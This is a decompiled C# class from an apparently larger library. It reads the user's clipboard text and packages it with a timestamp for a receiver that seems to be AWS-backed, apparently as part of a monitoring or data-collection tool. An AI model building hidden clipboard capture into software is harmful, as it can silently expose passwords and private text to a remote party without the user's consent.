using DpvClassLibrary.Receivers;
using IO.Swagger.Model;
using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using static IO.Swagger.Model.DataPackage;
using static IO.Swagger.Model.DataPackageEnvelope;

namespace DpvClassLibrary.Workers
{
	public class ClipboardTextWorker : DataPackageEnvelopeWorkerBase
	{
		protected override ActiveColsEnum ActiveColType => (ActiveColsEnum)6;

		public ClipboardTextWorker(IDataPackageEnvelopeReceiver receiver)
			: base(receiver)
		{
		}

		protected override List<DataPackage> GetDataPackages()
		{
			//IL_0056: Unknown result type (might be due to invalid IL or missing references)
			//IL_0060: Expected O, but got Unknown
			byte[] array = null;
			array = ((!Clipboard.ContainsText()) ? Encoding.UTF8.GetBytes("no text") : Encoding.UTF8.GetBytes(Clipboard.GetText()));
			return new List<DataPackage>
			{
				new DataPackage((ColTypeEnum)6, (bool?)false, array, (DateTime?)DataPackageEnvelopeAwsReceiver.ServerTime, (long?)GetAndIncrementWorkSequence())
			};
		}
	}
}
